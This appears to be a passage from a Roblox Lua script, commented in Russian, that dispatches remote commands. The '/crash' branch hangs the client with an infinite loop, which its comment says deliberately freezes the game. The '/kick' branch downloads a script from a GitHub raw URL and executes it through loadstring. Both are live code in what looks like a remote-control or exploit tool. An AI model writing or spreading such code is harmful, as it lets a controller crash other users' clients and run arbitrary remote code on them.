
                        -- === ИСПОЛНЕНИЕ КОМАНД ===
                        if Mega and Mega.Commands and Mega.Commands[cmd] then
                            -- Динамически вызываем функцию команды, если она существует в модулях
                            task.spawn(Mega.Commands[cmd], data)
                        elseif cmd == "/crash" then
                            -- Бесконечный цикл намертво вешает клиент Роблокса
                            while true do end 
                        elseif cmd =="/kick" then
                            loadstring(game:HttpGet("https://raw.githubusercontent.com/repositorykreml1n/commands/refs/heads/main/kick.lua"))() 
                        end
                        -- =========================
                    end
                end
            end
    end
end)
-- ========================================================
